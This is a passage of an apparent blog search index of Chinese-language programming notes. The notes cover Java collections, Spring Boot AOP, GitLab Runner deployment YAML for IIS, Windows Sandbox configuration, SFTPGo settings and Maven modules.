prompt","uri":"/blog/posts/Electron-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8-prompt/"},{"categories":["Java"],"content":"整理網路文章方法小記。 list - Get unique values from ArrayList in Java - Stack Overflow List\u003cString\u003e gasList = // create list with duplicates... Set\u003cString\u003e uniqueGas = new HashSet\u003cString\u003e(gasList); System.out.println(\"Unique gas count: \" + uniqueGas.size()); uniqueGas.toArray(new String[0]); String[] unique = new HashSet\u003cString\u003e(Arrays.asList(array)).toArray(new String[0]); and shorter and simpler in java 8: String[] unique = Arrays.stream(array).distinct().toArray(String[]::new); java - Array of unique elements? - Stack Overflow int[] noDuplicates = IntStream.of(array).distinct().toArray(); Java 8 stream distinct by multiple fields - HowToDoInJava ","date":"2022-07-31","objectID":"/blog/posts/Java-Arraylist-array-distinct-%E6%96%B9%E6%B3%95-%E7%A7%BB%E9%99%A4-null-%E6%96%B9%E6%B3%95/:0:0","tags":["java","array","arraylist","distinct"],"title":"Java Arraylist/array distinct 方法 / 移除 null 方法","uri":"/blog/posts/Java-Arraylist-array-distinct-%E6%96%B9%E6%B3%95-%E7%A7%BB%E9%99%A4-null-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"移除 null 方法 Java program to remove nulls from a List Container 各種寫法…大神啦!! Java program to remove nulls from a List Container - GeeksforGeeks 備份圖 import java.util.*; class GFG { public static void main(String[] args) { // Create the list with null values List\u003cString\u003e list = new ArrayList\u003c\u003e( Arrays.asList(\"Geeks\", null, \"forGeeks\", null, \"A computer portal\")); // Print the list System.out.println(\"Initial List: \" + list); // Removing nulls using List.remove() // Repeatedly call remove() till all null are removed while (list.remove(null)) { } // Print the list System.out.println(\"Modified List: \" + list); } } import com.google.common.base.Predicates; import com.google.common.collect.Iterables; import java.util.*; class GFG { public static void main(String[] args) { // Create the list with null values List\u003cString\u003e list = new ArrayList\u003c\u003e( Arrays.asList(\"Geeks\", null, \"forGeeks\", null, \"A computer portal\")); // Print the list System.out.println(\"Initial List: \" + list); // Removing nulls using Guava Iterables // using Predicate condition isNull() Iterables.removeIf(list, Predicates.isNull()); // Print the list System.out.println(\"Modified List: \" + list); } } ","date":"2022-07-31","objectID":"/blog/posts/Java-Arraylist-array-distinct-%E6%96%B9%E6%B3%95-%E7%A7%BB%E9%99%A4-null-%E6%96%B9%E6%B3%95/:1:0","tags":["java","array","arraylist","distinct"],"title":"Java Arraylist/array distinct 方法 / 移除 null 方法","uri":"/blog/posts/Java-Arraylist-array-distinct-%E6%96%B9%E6%B3%95-%E7%A7%BB%E9%99%A4-null-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"之前有寫過mysql COALESCE 取代null值好方法 | 程式狂想筆記 最近遇到筆記一下。 SELECT COALESCE(NULLIF(Other,''),Industry) Ind FROM registration sql server - SQL Coalesce with empty string - Stack Overflow ","date":"2022-07-31","objectID":"/blog/posts/COALESCE-%E6%8E%92%E9%99%A4%E7%A9%BA%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/:0:0","tags":["sql","coalesce"],"title":"COALESCE 排除空字串方法","uri":"/blog/posts/COALESCE-%E6%8E%92%E9%99%A4%E7%A9%BA%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/"},{"categories":["Docker"],"content":"文章蒐集 ","date":"2022-07-31","objectID":"/blog/posts/Docker-Security-%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/:0:0","tags":["docker","security"],"title":"Docker Security 文章整理","uri":"/blog/posts/Docker-Security-%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"文章 淺析Docker執行安全_FreeBuf - MdEditor 為何在 Docker 中執行特權容器不是個好主意? – 資安趨勢部落格 Docker 容器的 root 安全吗？ - DCS 文档 淺談Docker的安全性支援（上篇）_小米運維 - MdEditor ","date":"2022-07-31","objectID":"/blog/posts/Docker-Security-%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/:1:0","tags":["docker","security"],"title":"Docker Security 文章整理","uri":"/blog/posts/Docker-Security-%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/"},{"categories":["Regex"],"content":"實用整理。 ","date":"2022-07-31","objectID":"/blog/posts/Regex-%E5%AF%A6%E7%94%A8%E6%95%B4%E7%90%86/:0:0","tags":["regex"],"title":"Regex 實用整理","uri":"/blog/posts/Regex-%E5%AF%A6%E7%94%A8%E6%95%B4%E7%90%86/"},{"categories":["Regex"],"content":"Email Regex Email Address Regular Expression That 99.99% Works. ","date":"2022-07-31","objectID":"/blog/posts/Regex-%E5%AF%A6%E7%94%A8%E6%95%B4%E7%90%86/:1:0","tags":["regex"],"title":"Regex 實用整理","uri":"/blog/posts/Regex-%E5%AF%A6%E7%94%A8%E6%95%B4%E7%90%86/"},{"categories":["Java"],"content":"每次都會忘記，直接先記錄在這邊。通常是用不到，除非真的需要動態，但不推薦。 ","date":"2022-07-31","objectID":"/blog/posts/Java-Class-%E5%8B%95%E6%85%8B%E5%BB%BA%E7%AB%8B-new-%E8%88%87%E5%91%BC%E5%8F%AB%E6%96%B9%E6%B3%95-call-Method/:0:0","tags":["java","class"],"title":"Java Class 動態建立(new)與呼叫方法(call Method)","uri":"/blog/posts/Java-Class-%E5%8B%95%E6%85%8B%E5%BB%BA%E7%AB%8B-new-%E8%88%87%E5%91%BC%E5%8F%AB%E6%96%B9%E6%B3%95-call-Method/"},{"categories":["Java"],"content":"相關文章 .class 與 Class 怎麼當鴨子 從 Class 獲取資訊 ","date":"2022-07-31","objectID":"/blog/posts/Java-Class-%E5%8B%95%E6%85%8B%E5%BB%BA%E7%AB%8B-new-%E8%88%87%E5%91%BC%E5%8F%AB%E6%96%B9%E6%B3%95-call-Method/:1:0","tags":["java","class"],"title":"Java Class 動態建立(new)與呼叫方法(call Method)","uri":"/blog/posts/Java-Class-%E5%8B%95%E6%85%8B%E5%BB%BA%E7%AB%8B-new-%E8%88%87%E5%91%BC%E5%8F%AB%E6%96%B9%E6%B3%95-call-Method/"},{"categories":["XShell"],"content":"小記 ","date":"2022-07-31","objectID":"/blog/posts/XShell-7%E9%97%9C%E6%8E%89%E5%9C%96%E5%BD%A2%E4%BB%8B%E9%9D%A2/:0:0","tags":["xshell"],"title":"XShell 7關掉圖形介面","uri":"/blog/posts/XShell-7%E9%97%9C%E6%8E%89%E5%9C%96%E5%BD%A2%E4%BB%8B%E9%9D%A2/"},{"categories":["XShell"],"content":"XShell 7連線屬性設定 如果有在用XShell 7做維運，連線屬性設定-\u003e連線-\u003eSSH-\u003e通道-\u003eX11轉寄[預設會勾選，建議取消勾選] 因為當你用這個連線啟動的程式跟處理圖形處理有關時(產條碼or報表內部有用到…)，有勾選 X11轉寄的話會用到Linux的X-Windown(X11)，XShell 7會彈出這個訊息： 轉檔程式就會出現類似這樣的錯誤： ","date":"2022-07-31","objectID":"/blog/posts/XShell-7%E9%97%9C%E6%8E%89%E5%9C%96%E5%BD%A2%E4%BB%8B%E9%9D%A2/:1:0","tags":["xshell"],"title":"XShell 7關掉圖形介面","uri":"/blog/posts/XShell-7%E9%97%9C%E6%8E%89%E5%9C%96%E5%BD%A2%E4%BB%8B%E9%9D%A2/"},{"categories":["Java"],"content":"之前我同事推坑 Spring Boot 框架給我，跟我說 Sping 重要觀念有兩個，一個是 注入 另一個是 AOP 。目前注入常常使用，但是不常使用 AOP，最近用點時間整理一下。 ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:0:0","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"觀念 ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:1:0","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"推薦 轻松理解 Spring AOP - 阿dun - 博客园 備份圖 Spring AOP概念Aspect、Advice、JoinPoint、JoinCut与Execution_Anur的博客-CSDN博客_advice aspect 可以看詳細 Introduction to Spring AOP | Baeldung 浅谈AOP以及AspectJ和Spring AOP - SegmentFault 思否 徹底征服 Spring AOP 之 理論篇 - 簡書 備份圖 徹底征服 Spring AOP 之 實戰篇 - 簡書 AspectJ报错：error at ::0 can’t find referenced pointcut XXX - 楼兰胡杨 - 博客园 菜鳥工程師 肉豬: Spring AOP get method advice annotation and parameters 4.3.3　处理通知中的参数 - Spring 实战(第四版) ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:1:1","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"AOP錯誤: error at ::0 can’t find referenced pointcut XXX package com.example.demo; import org.aspectj.lang.ProceedingJoinPoint; import org.aspectj.lang.annotation.After; import org.aspectj.lang.annotation.Around; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Before; import org.springframework.stereotype.Component; import org.springframework.util.StopWatch; @Component @Aspect public class TestAspect { .... @Around(\"com.example.demo.TestClass.callMethod()\") public Object doAroundAccessCheck(ProceedingJoinPoint pjp) throws Throwable { StopWatch stopWatch = new StopWatch(); stopWatch.start(); // 开始 Object retVal = pjp.proceed(); stopWatch.stop(); // 结束 System.out.println(\"invoke method: \" + pjp.getSignature().getName() + \", elapsed time: \" + stopWatch.getTotalTimeMillis()); return retVal; } } 可參考:AspectJ报错：error at ::0 can’t find referenced pointcut XXX - 楼兰胡杨 - 博客园 不過我參照上面方法都失敗，所以我後來嘗試加上execution，順利解決問題。 @Around(\"execution(* com.example.demo.TestClass.callMethod())\") public Object doAroundAccessCheck(ProceedingJoinPoint pjp) throws Throwable { StopWatch stopWatch = new StopWatch(); stopWatch.start(); // 开始 Object retVal = pjp.proceed(); stopWatch.stop(); // 结束 System.out.println(\"invoke method: \" + pjp.getSignature().getName() + \", elapsed time: \" + stopWatch.getTotalTimeMillis()); return retVal; } ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:2:0","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"名詞小記 框架源码系列十：Spring AOP（AOP的核心概念回顾、Spring中AOP的用法、Spring AOP 源码学习） - 小不点啊 - 博客园 解說名詞: 淺談AOP以及AspectJ和Spring AOP - SegmentFault 思否 Spring系列（四）：Spring AOP详解 - toby.xu - 博客园 彻底征服 Spring AOP 之 理论篇 - 简书 Spring AOP概念Aspect、Advice、JoinPoint、JoinCut与Execution_Anur的博客-CSDN博客_advice aspect 其實當初看敘述有看沒有懂，對照敘述我的理解先記錄下來，之後回頭複習希望能馬上進入狀況。 簡單我的觀點來看，Spring @Transactional都會用代理模式，這邊AOP其實也類似做一樣動作，底層(應該)用做代理模式去做，達成這個效果。 JoinPoint: 中文叫連接點，多個執行點可執行自訂要跑的程式(Advice)。 PointCut: 中文叫斷點，其中一個被選定的JoinPoint。 Advice: 就是你當PointCut 觸發要執行的程式。 程式配置可以參考: ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:2:1","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"記錄重點 ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:3:0","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"pom.xml 不知道為什麼 Spring Initializr 找不到這個，要自己加到 pom.xml。 \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-aop\u003c/artifactId\u003e \u003c/dependency\u003e ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:3:1","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"程式 src/main/java/com/example/demo/DemoApplication.java @SpringBootApplication public class DemoApplication { public static void main(String[] args) { ApplicationContext ctx = SpringApplication.run(DemoApplication.class, args); var testClass = ctx.getBean(TestClass.class); testClass.callMethod(); } } src/main/java/com/example/demo/TestClass.java package com.example.demo; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; @Service public class TestClass { @Autowired TestClass _testClass; public void callMethod() { System.out.println(\"Hello World!!!!你好世界\"); _testClass.callMethod2(); } public void callMethod2() { System.out.println(\" callMethod2\"); } } src/main/java/com/example/demo/TestAspect.java @Component @Aspect public class TestAspect { @Before(\"execution(* callMethod())\") public void before(){ System.out.println(\"我在你前面做\"); } @After(\"execution(* callMethod())\") public void after(){ System.out.println(\"我在你後面做\"); } @Around(\"execution(* com.example.demo.TestClass.callMethod())\") public Object doAroundAccessCheck(ProceedingJoinPoint pjp) throws Throwable { StopWatch stopWatch = new StopWatch(); stopWatch.start(); // 开始 Object retVal = pjp.proceed(); stopWatch.stop(); // 结束 System.out.println(\"invoke method: \" + pjp.getSignature().getName() + \", elapsed time: \" + stopWatch.getTotalTimeMillis()); return retVal; } } ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:3:2","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"其他重點 參考:Spring AOP中JoinPoint的用法 - 简书 Object[] getArgs(); 獲取傳入目標方法的引數物件 Object getTarget(); 獲取被代理的物件 Object getThis(); 獲取代理物件 參考:Spring AOP概念Aspect、Advice、JoinPoint、JoinCut與Execution_Anur的博客-CSDN博客_advice aspect 參考:4.3.3　处理通知中的参数 - Spring 实战(第四版) ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:4:0","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"感想 這邊源碼我有丟到 Github: malagege/spring-boot-aop-example: 範例測試 我以為很難，其實寫出範例又好像很簡單。後來想到滿多機制能用這個寫，像重試API測試，我們也可以透過AOP方式，後來我很好奇有沒有別人現成寫好的工具，發現spring-retry可以做到這些事情。 文章整理: spring-retry 重試機制 Spring Boot中使用Spring-Retry重试框架_c.的博客-CSDN博客_springboot 重试框架 Spring 指南（spring-retry） - SegmentFault 思否 ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:5:0","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"彩蛋 依賴注入循環問題。 spring.main.allow-circular-references=true Requested bean is currently in creation: Is there an unresolvable circular reference?_Moshow郑锴的博客-CSDN博客 基于Spring AOP的分布式锁简单实现 | Smart_咚咚 基于AOP实现简单的自动重复执行注解 - SZnCu的喵窝 ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:6:0","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":".Net Core 另外 Retry 方案 HttpClient，該 using 還是 static?-黑暗執行緒 Using Retry Pattern In ASP.NET Core Via Polly .NET 开源项目 Polly 介绍 - 精致码农 - 博客园 ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/:6:1","tags":["spring","aop"],"title":"Spring Boot AOP 小記","uri":"/blog/posts/Spring-Boot-AOP-%E5%B0%8F%E8%A8%98/"},{"categories":["Git"],"content":"找到相關有兩個方法，參照這篇文章:如何让多个 gitlab-runner 运行同一个 tag 的 job_已解决_博问_博客园 目前沒有環境測試，看是觸發只會跑一個tag的Runner。看資料整理出來修改設定，以下試試看。 ","date":"2022-07-31","objectID":"/blog/posts/Gitlab-Runner-%E5%90%8C%E6%99%82%E8%B7%91%E5%A4%9A%E5%8F%B0%E9%9B%BB%E8%85%A6%E6%96%B9%E6%B3%95/:0:0","tags":["gitlab","git","runner"],"title":"Gitlab Runner 同時跑多台電腦方法","uri":"/blog/posts/Gitlab-Runner-%E5%90%8C%E6%99%82%E8%B7%91%E5%A4%9A%E5%8F%B0%E9%9B%BB%E8%85%A6%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"extends(兩台主機，安裝Runner，tag設定不同) stages: - deploy-prod-main - deploy-prod-sub .deploy-prod: msbuild: stage: build only: - main script: - echo \"Stop IIS Pool\" - $state = (Get-WebAppPoolState -Name MobileAttendanceBackend).Value - if($state -Like \"Start*\") {Stop-WebAppPool -Name MobileAttendanceBackend} - echo \"Nuget restore\" - C:\\MobileAttendance\\Deploy\\nuget.exe restore - echo \"Copy web.config\" - xcopy C:\\MobileAttendance\\Deploy\\web.config C:\\MobileAttendance\\Backend\\ /y - echo \"MSBuild\" - '\u0026 \"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\amd64\\msbuild.exe\" mobile-attendance-api.sln /p:platform=\"any cpu\" /p:configuration=\"release\" /t:mobile-attendance-api /p:OutDir=C:\\MobileAttendance\\Backend' - echo \"Start IIS Pool\" - C:\\Windows\\System32\\inetsrv\\appcmd start apppool /apppool.name:MobileAttendanceBackend deploy-prod-main: extends: .deploy-prod tags: - prod-main deploy-prod-sub: extends: .deploy-prod tags: - prod-sub last-job: stage: .post tags: - \"MobileAttendanceVM\" only: - main script: - echo \"All Stages Finished.\" 這邊兩台主機設定不一樣tag，一台prod-main另一台prod-sub ","date":"2022-07-31","objectID":"/blog/posts/Gitlab-Runner-%E5%90%8C%E6%99%82%E8%B7%91%E5%A4%9A%E5%8F%B0%E9%9B%BB%E8%85%A6%E6%96%B9%E6%B3%95/:1:0","tags":["gitlab","git","runner"],"title":"Gitlab Runner 同時跑多台電腦方法","uri":"/blog/posts/Gitlab-Runner-%E5%90%8C%E6%99%82%E8%B7%91%E5%A4%9A%E5%8F%B0%E9%9B%BB%E8%85%A6%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"parallel(兩台主機安裝Runner，tag設定相同) stages: - build msbuild: stage: build tags: - \"MobileAttendanceVM\" only: - main script: - echo \"Stop IIS Pool\" - $state = (Get-WebAppPoolState -Name MobileAttendanceBackend).Value - if($state -Like \"Start*\") {Stop-WebAppPool -Name MobileAttendanceBackend} - echo \"Nuget restore\" - C:\\MobileAttendance\\Deploy\\nuget.exe restore - echo \"Copy web.config\" - xcopy C:\\MobileAttendance\\Deploy\\web.config C:\\MobileAttendance\\Backend\\ /y - echo \"MSBuild\" - '\u0026 \"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\amd64\\msbuild.exe\" mobile-attendance-api.sln /p:platform=\"any cpu\" /p:configuration=\"release\" /t:mobile-attendance-api /p:OutDir=C:\\MobileAttendance\\Backend' - echo \"Start IIS Pool\" - C:\\Windows\\System32\\inetsrv\\appcmd start apppool /apppool.name:MobileAttendanceBackend variables: DEPLOY_RUNNER: ${DEPLOY_RUNNER} parallel: matrix: - DEPLOY_RUNNER: [server1, server2] last-job: stage: .post tags: - \"MobileAttendanceVM\" only: - main script: - echo \"All Stages Finished.\" 兩台主機Runner設定相同Tag，如:MobileAttendanceVM。DEPLOY_RUNNER看說明是隨意打兩個名稱(不用對照名字)，這邊寫幾個就會執行幾個Runner。 ","date":"2022-07-31","objectID":"/blog/posts/Gitlab-Runner-%E5%90%8C%E6%99%82%E8%B7%91%E5%A4%9A%E5%8F%B0%E9%9B%BB%E8%85%A6%E6%96%B9%E6%B3%95/:2:0","tags":["gitlab","git","runner"],"title":"Gitlab Runner 同時跑多台電腦方法","uri":"/blog/posts/Gitlab-Runner-%E5%90%8C%E6%99%82%E8%B7%91%E5%A4%9A%E5%8F%B0%E9%9B%BB%E8%85%A6%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"其他相關文章 使用 Gitlab CI/CD 实现自动化发布站点到 IIS - Wigor - 博客园 超简单！asp.net core前后端分离项目使用gitlab-ci持续集成到IIS_mb607022e25a607的技术博客_51CTO博客 How to setup Continuous Integration/Deployment with GitLab for ASP NET Core application How To Set Up a Continuous Deployment Pipeline with GitLab CI/CD on Ubuntu 18.04 | DigitalOcean 如何让多个 gitlab-runner 运行同一个 tag 的 job_已解决_博问_博客园 Gitlab CI/CD 介紹與 Runner 的架設. 此篇參考[DevOps] Gitlab CI/CD 及 GitLab 的… | by Kiwi lee | Medium ","date":"2022-07-31","objectID":"/blog/posts/Gitlab-Runner-%E5%90%8C%E6%99%82%E8%B7%91%E5%A4%9A%E5%8F%B0%E9%9B%BB%E8%85%A6%E6%96%B9%E6%B3%95/:3:0","tags":["gitlab","git","runner"],"title":"Gitlab Runner 同時跑多台電腦方法","uri":"/blog/posts/Gitlab-Runner-%E5%90%8C%E6%99%82%E8%B7%91%E5%A4%9A%E5%8F%B0%E9%9B%BB%E8%85%A6%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"有空整理筆記，因該有用到再回來補。 ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-%E6%8E%92%E9%99%A4-autowired-%E6%96%B9%E6%B3%95/:0:0","tags":["java","spring","di"],"title":"Spring Boot 排除 autowired 方法","uri":"/blog/posts/Spring-Boot-%E6%8E%92%E9%99%A4-autowired-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"有空整理筆記 https://blog.csdn.net/winterking3/article/details/114699603 備份圖 https://blog.csdn.net/u011047968/article/details/106170797 備份圖 ","date":"2022-07-31","objectID":"/blog/posts/Spring-Boot-%E6%8E%92%E9%99%A4-autowired-%E6%96%B9%E6%B3%95/:1:0","tags":["java","spring","di"],"title":"Spring Boot 排除 autowired 方法","uri":"/blog/posts/Spring-Boot-%E6%8E%92%E9%99%A4-autowired-%E6%96%B9%E6%B3%95/"},{"categories":["Windows"],"content":"有空研究在整理 ","date":"2022-07-31","objectID":"/blog/posts/Windows-Sandbox-%E5%8F%83%E6%95%B8%E8%AA%BF%E6%95%B4%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:0:0","tags":["windows","sandbox"],"title":"Windows Sandbox 參數調整設定小記","uri":"/blog/posts/Windows-Sandbox-%E5%8F%83%E6%95%B8%E8%AA%BF%E6%95%B4%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"隨意小記 分享一組我在啟動 Windows Sandbox 時都會執行的初始設定腳本 | The Will Will Web (11) How to configure Windows Sandbox - YouTube https://docs.microsoft.com/zh-tw/powershell/module/microsoft.powershell.core/about/about_scripts?view=powershell-7.2 powershell 呼叫 https://stackoverflow.com/questions/64795150/windows-sandbox-powershell-logon-command-window-not-visible \u003cConfiguration\u003e \u003cMappedFolders\u003e \u003cMappedFolder\u003e \u003cHostFolder\u003eC:\\SandboxScripts\u003c/HostFolder\u003e \u003cReadOnly\u003etrue\u003c/ReadOnly\u003e \u003c/MappedFolder\u003e \u003cMappedFolder\u003e \u003cHostFolder\u003eC:\\CodingProjects\u003c/HostFolder\u003e \u003cReadOnly\u003efalse\u003c/ReadOnly\u003e \u003c/MappedFolder\u003e \u003c/MappedFolders\u003e \u003cLogonCommand\u003e \u003cCommand\u003epowershell -executionpolicy unrestricted -command \"start powershell {-noexit -file C:\\SandboxScripts\\autorun.ps1}\"\u003c/Command\u003e \u003c/LogonCommand\u003e \u003c/Configuration\u003e Customize Windows Sandbox ","date":"2022-07-31","objectID":"/blog/posts/Windows-Sandbox-%E5%8F%83%E6%95%B8%E8%AA%BF%E6%95%B4%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:1:0","tags":["windows","sandbox"],"title":"Windows Sandbox 參數調整設定小記","uri":"/blog/posts/Windows-Sandbox-%E5%8F%83%E6%95%B8%E8%AA%BF%E6%95%B4%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"最近看到我買的新筆電重製電腦用到 DISM 工具。這邊有稍微找一下資訊，我還想到以前有用到 Sysprep ，這邊也爬文懷舊一些東西。 ","date":"2022-07-31","objectID":"/blog/posts/Sysprep-%E5%92%8C-DISM/:0:0","tags":["sysprep","dism","windows"],"title":"Sysprep 和 DISM","uri":"/blog/posts/Sysprep-%E5%92%8C-DISM/"},{"categories":["Windows"],"content":"整理連結 Windows 10 Sysprep 系統準備步驟1 | [windows] sysprep教學 @ Frank’s Blog :: 痞客邦 :: IT小僧 - 使用 sysprep 出現錯誤(可用重置次數超過系統限制) 如何防止學生 重製 win10 系統?!!! - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 SL大法好！win10任你虐，一招搞定Windows系統備份，防患於未然 - 每日頭條 (Windows) DISM备份还原 - CodeAntenna dism++和ghost备份有区别吗-远景论坛-微软极客社区 如何使用 DISM 命令工具修复 Windows 10 映像 - 帮助和操作方法 | 可能 2022 如何利用 DISM 指令掛載映像檔(wim)? 3分鐘學會映像檔的掛載與卸載 » 阿德說科技 ","date":"2022-07-31","objectID":"/blog/posts/Sysprep-%E5%92%8C-DISM/:1:0","tags":["sysprep","dism","windows"],"title":"Sysprep 和 DISM","uri":"/blog/posts/Sysprep-%E5%92%8C-DISM/"},{"categories":["實用工具"],"content":"因為工作需求，測試環境沒有 sftp，目前先找簡易的 sftp 建置，有找到一個好用的 SFTPGo 工具，這邊簡單紀錄。 Releases · drakkan/sftpgo 浮雲雅築: [研究] 免費 Free SFTP、FTPS Server ","date":"2022-07-31","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%BD%AE-sftp-server-SFTPGo/:0:0","tags":["sftp","golang"],"title":"快速建置 sftp server (SFTPGo)","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%BD%AE-sftp-server-SFTPGo/"},{"categories":["實用工具"],"content":"設定檔 sftpgo.json 裡面很長，但簡單紀錄幾個比較重要設定，如Port }, \"httpd\": { \"bindings\": [ { \"port\": 8080, \"address\": \"\", \"enable_web_admin\": true, \"enable_web_client\": true, \"enable_https\": false, \"client_auth_type\": 0, \"tls_cipher_suites\": [], \"proxy_allowed\": [], \"hide_login_url\": 0, \"render_openapi\": true, \"web_client_integrations\": [] } ], ... \"sftpd\": { \"bindings\": [ { \"port\": 2022, \"address\": \"\", \"apply_proxy_config\": true } ], \"max_auth_tries\": 0, \"banner\": \"\", \"host_keys\": [], sftpgo serve 仔細看官方文件，感覺滿多設定可以玩。 ","date":"2022-07-31","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%BD%AE-sftp-server-SFTPGo/:1:0","tags":["sftp","golang"],"title":"快速建置 sftp server (SFTPGo)","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%BD%AE-sftp-server-SFTPGo/"},{"categories":["Java"],"content":"前言 之前我們使用專案，需要透過 Eclipse 設定相關套件或Project 依賴。這邊我們看到 Maven 可以加載 Jar，對應相關 Project 卻沒有明確知道，最近發現 Maven 也能做到相同的事情。 我找到是使用 Module 方法，發現這水很深，，這邊也採了一些坑，這邊簡單做個紀錄。不會對全部功能做個假解。 ","date":"2022-07-31","objectID":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/:1:0","tags":["maven","java","jar"],"title":"Maven 使用 Modules 載入 Project 的 Jar 方法","uri":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"有關 Maven 文章整理 網路找到一些不錯文章，先整理在這邊。 Eclipse中Maven Module和Maven Project的区别_程序媛搬砖的博客-CSDN博客_maven module和maven project 備份圖 學 Maven，看松哥這一篇就夠了 備份圖 maven模組化管理 | 程式前沿 Maven pom.xml中的元素modules、parent、properties以及import - 青石路 - 博客园 備份圖 项目构建工具Maven-11多模块-继承-聚合-依赖_哔哩哔哩_bilibili ","date":"2022-07-31","objectID":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/:2:0","tags":["maven","java","jar"],"title":"Maven 使用 Modules 載入 Project 的 Jar 方法","uri":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"了解前最好了解東西 完全不熟的人可以推薦看一下项目构建工具Maven-11多模块-继承-聚合-依赖_哔哩哔哩_bilibili影片，看完應該就大概了解怎麼使用。 ","date":"2022-07-31","objectID":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/:3:0","tags":["maven","java","jar"],"title":"Maven 使用 Modules 載入 Project 的 Jar 